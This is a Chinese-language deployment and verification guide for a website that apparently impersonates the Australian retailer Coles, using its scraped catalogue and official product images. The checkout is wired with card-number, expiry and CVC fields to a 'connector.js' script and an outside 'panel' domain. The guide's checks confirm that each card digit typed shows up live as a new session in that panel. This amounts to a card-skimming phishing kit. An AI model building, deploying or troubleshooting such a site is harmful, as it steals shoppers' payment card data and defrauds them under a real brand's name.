# 部署说明（GitHub → Cloudflare Pages）

## 0. 参数

| 项 | 值 |
|---|---|
| Build command | `npm run build` |
| Build output directory | `dist` |
| 环境变量 | `NODE_VERSION=22`（仓库已带 `.node-version`） |
| Functions | 仓库根 `functions/`，Pages 自动接管，不需要 wrangler |
| 需要的仓库文件 | `scrape/raw/products.json`（已提交，8 MB）——构建时离线读它生成目录，**不需要抓网** |

## 1. 推送更新

```powershell
cd "F:\DSH\项目\澳洲coles"
git add -A
git commit -m "Use real Coles catalogue: 11,458 SKUs with official product images"
git push
```

推上去 Pages 会自动重建（约 1–2 分钟）。

如果 Cloudflare 那个项目是 **Pages**（域名 `*.pages.dev`）：只用 `functions/` + `dist`，`worker/index.js` 与 `wrangler.toml` 会被忽略，不用管。
如果哪天要在 **Workers** 里跑：把构建命令设 `npm run build`、部署命令设 `npx wrangler deploy`，`wrangler.toml` 已经把 `./dist` 挂成静态资源（`ASSETS` binding），`worker/index.js` 把 `/api/*` 转给同一份 handlers。

## 2. 部署后逐条验收

```powershell
$S = "https://<你的站点域>"

curl.exe -sI "$S/checkout"                     # 200，无 Location，CSP 含 annangourmet.makeup
curl.exe -s -o NUL -w "bp=%{http_code}`n" "$S/bp/connector.js"
curl.exe -s -o NUL -w "data=%{http_code}`n" "$S/data/catalog.json"
curl.exe -s "$S/api/cart"
curl.exe -s -X POST "$S/api/checkout" -H "Content-Type: application/json" `
  -d '{\"order_number\":\"ORD-VERIFY-0001\",\"amount\":4299,\"currency\":\"AUD\"}'
```

浏览器再确认：

- 首页任意商品卡片有真实产品图（域名是 `productimages.coles.com.au`）
- `document.querySelectorAll('#bp-card-number,#bp-card-expiry,#bp-card-cvc').length` → `3`
- `window.__BP_CART__.total_amount === document.getElementById('bp-total').textContent` → `true`
- 输入一位卡号，面板「实时同步」出现新会话（`logname=WordPress`）

## 3. 换成正式像素

改 `src/fb.js` 第一行 `FB_PIXEL_ID` → 提交 → Pages 自动重建。

## 4. 常见问题

| 现象 | 原因 | 处理 |
|---|---|---|
| 装修后首页空白、控制台 404 `/data/catalog.json` | `npm run gen` 没跑（构建命令被改成只 `vite build`） | 构建命令必须是 `npm run build`，它包含 gen |
| 商品图裂 | 客户端网络访问不到 Coles CDN | 组件已回退 `/img/placeholder.svg`；要彻底自持可以加构建期镜像步骤（见 README「数据从哪来」） |
| `/api/cart` 404 | 仓库根没有 `functions/` | 确认 `functions/api/cart.js` 在仓库里 |
| 验证屏白屏 | CSP 少了面板域 | `public/_headers` 里已有 `https://annangourmet.makeup` |
| 首屏慢 | 目录 JSON 5.2 MB（brotli 460 KB） | 属预期；Cloudflare 会自动压缩，`/data/*` 已设 `max-age=600` |

## 5. 体积

| 产物 | 体积 |
|---|---|
| `dist/assets/*.js` 外壳 | 241 KB（gzip 77 KB） |
| `dist/data/catalog.json` | 5.2 MB（brotli 460 KB） |
| `dist/bp/` | 约 200 KB |
| `dist/img/` | logo + 占位图 + 6 张轮播，远小于 1 MB |
